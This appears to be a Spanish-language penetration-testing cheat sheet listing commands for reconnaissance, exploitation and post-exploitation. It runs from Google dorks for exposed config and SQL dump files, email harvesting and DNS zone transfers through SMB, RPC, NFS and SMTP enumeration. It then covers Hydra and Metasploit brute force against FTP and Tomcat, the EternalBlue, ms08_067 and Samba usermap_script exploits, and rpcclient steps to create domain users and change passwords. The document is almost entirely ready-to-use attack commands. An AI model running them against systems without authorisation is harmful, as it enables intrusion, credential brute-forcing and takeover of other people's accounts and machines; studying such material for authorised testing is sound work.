Obtención de info

whois (información general)

site:WEB filetype:cfg
mysql dump filetype:sql

Crear diccionarios
	cewl -w DICC-OUTPUT.txt --with-numbers -a -e URL

Crawling de emails
	theharvester -d URL -b all > mail.txt (-d usa todos los motores de búsqueda)
	SIMPLYEMAIL
		git clone https://github.com/killswitch-GUI/SimplyEmail.git
		pip install fake_useragent
		pip install BeautifulSoup
		pip install docx2txt
		python SimplyEmail.py -all -e URL
Metadatos de documentos
	metagoofil -d [url] -t [tipo de documento] -l [límite] -n [intentos] -o [archivo de salida] -f [archivo html que genera el programa]

DNS
	nslookup
		set type=mx (para obtener servidores de correo corporativos)
	DNS Zone Transfers
		host -t ns [url] // Para obtener el nameserver
		host -l [url] [nameserver] // Para intentar hacer el zone transfer y que muestre toda la lista de resoluciones DNS
	dnsrecon -d URL -t axfr
	dnsenum URL

Enum directorios
	gobuster -w WORDLIST -u URL -t 50 [-x php,txt,html,htm] [-k] (para saltar comprobación SSL) dir
	wfuzz --hc 404 -w /usr/share/wordlists/dirb/common.txt [IP]
	dirb URL DICC
	dirb URL -z 100 (Delay ms) (no hace falta diccionario)
	dirb URL -p IP:PUERTO // Usar un proxy
	uniscan -u URL -qweds

SMB
	use auxiliary/scanner/smb/smb_version
	enum4linux -a IP
	nbtscan -r RED
	smbclient -L //IP // Ya lo hace enum4linux. Lista recursos compartidos en la máquina con null session
	smbclient -U [username] -L [IP target] // Ya lo hace enum4linux
	smbclient -W DOMAIN -U USER \\\\COMPUTER_NAME\\NETLOGON
	smb-enum-shares.nse -p445
	nbstat.nse -p 137 // Netbios expuestos
	smb-os-discovery.nse
	smb-enum-users.nse -p U:137,T:139

FTP
	use scanner/ftp/anonymous (Comprueba si se puede acceder de forma anónima mediante ftp)
		definir RHOSTS (targets)

RPC
	rpcinfo -p IP [apt-get install nfs-common]
	rpcclient -U ""/"USERNAME" --command=enumprivs -N IP // Enumerar privilegios
	rpcclient -U "" (Y después ir probando entre las comillas posibles usernames) IP
	Probamos con contraseñas vacías

NFS
	nmap -sV --script=nfs-showmount IP
	showmount -e IP
	mount IP:/directorio /mnt

TELNET
	use auxiliary/scanner/telnet/telnet_version

MYSQL
	use auxiliary/admin/mysql/mysql_enum
	
MSSQL
	nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER IP

VNC
	use auxiliary/scanner/vnc/vnc_none_auth

SMTP
	nc -v [ip] 25
	VRFY [usuario] Para comprobar si ese usuario existe y su email
	HELO asdf // Devuelve el nombre de dominio
	smtp-commands.nse
	




Explotación

FTP
	hydra -L USERS.txt -P PASS.txt -vV IP ftp
	use auxiliary/scanner/ftp/ftp_login
	set user_file /usr/share/metasploit-framework/data/wordlists/unix_users.txt
	touch /usr/share/metasploit-framework/data/wordlists/blank.txt
	set pass_file /usr/share/metasploit-framework/data/wordlists/blank.txt
	set user_as_pass true
  	set BRUTEFORCE_SPEED 1

TOMCAT
	use auxiliary/admin/http/tomcat_administration // Probar creds de admin
	set BLANK_PASSWORDS true
	set USER_AS_PASS true
	use auxiliary/scanner/http/tomcat_mgr_login // Login de manager
	set BLANK_PASSWORDS true
	set USER_AS_PASS true

SMB
	Para acceder a los directorios -> smbclient \\\\[IP Target]\\[Share al que accedemos, carpeta compartida o Share por defecto] -U [username]
  	put [archivo] (sube el archivo al directorio del ordenador víctima)
  	use exploit/multi/samba/usermap_script
  	Samba 3.0.
  		use auxiliary/scanner/smb/smb_ms17_010
		Si es vulnerable
			use exploit/windows/smb/ms17_010_eternalblue
  	Para WinXP =>
	smb-vuln-ms08-067.nse
	use auxiliary/scanner/smb/ms08_067_check
	use exploit/windows/smb/ms08_067_netapi => Puede que necesite bind_tcp
	payload windows/vncinject/bind_tcp
	

Post Explotación

RPC
	Si entramos, con srvinfo obtenemos info sobre el sistema
	Con querydominfo obtenemos más info
	Con enumdomusers enumeramos los usuarios del sistema
		cat salida.txt | cut -d "[" -f 2 | cut -d "]" -f 1 | sort -u > usersRPC.txt
	Con createdomuser [nombre] si tenemos privilegios creamos un usuario
	Con getdompwinfo vemos la complejidad mínima para las contraseñas
	Con chgpasswd2 [username] [old pass] [new pass] cambiamos la contraseña
	Con lsaquery (en teoría) obtenemos el nombre de dominio
